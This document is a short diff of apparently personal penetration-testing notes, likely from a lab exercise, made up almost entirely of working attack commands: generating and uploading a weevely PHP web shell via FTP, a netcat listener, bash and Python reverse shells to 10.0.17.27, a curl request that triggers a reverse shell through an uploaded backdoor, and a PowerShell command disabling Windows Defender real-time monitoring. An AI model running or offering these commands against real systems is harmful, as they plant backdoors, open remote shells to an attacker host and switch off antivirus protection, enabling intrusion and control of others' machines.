@@ -1,8 +1,14 @@
+Weevly usage
+generate: weevely generate 1234 backdoorjg.php    
+upload: ftp / cd upload / put backdoorjg.php 
+execute: weevely http://10.0.5.25/upload/backdoorjg.php 1234
 
+Starting listener: nc -lvnp 4449
+Simple shell: bash -i >& /dev/tcp/10.0.17.27/4449 0>&1
 
+Using simple backdoor on Pippin: curl "http://10.0.5.25/upload/simple-backdoor.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.0.17.27/4449+0>%261'"
 
-weevely generate 1234 backdoorjg.php    
+Turn off windows defender: Set-MpPreference -DisableRealtimeMonitoring $true
 
-ftp / cd upload / put backdoorjg.php 
+Python shell: python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.0.17.27",4460)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"]);'
 
-weevely http://10.0.5.25/upload/backdoorjg.php 1234
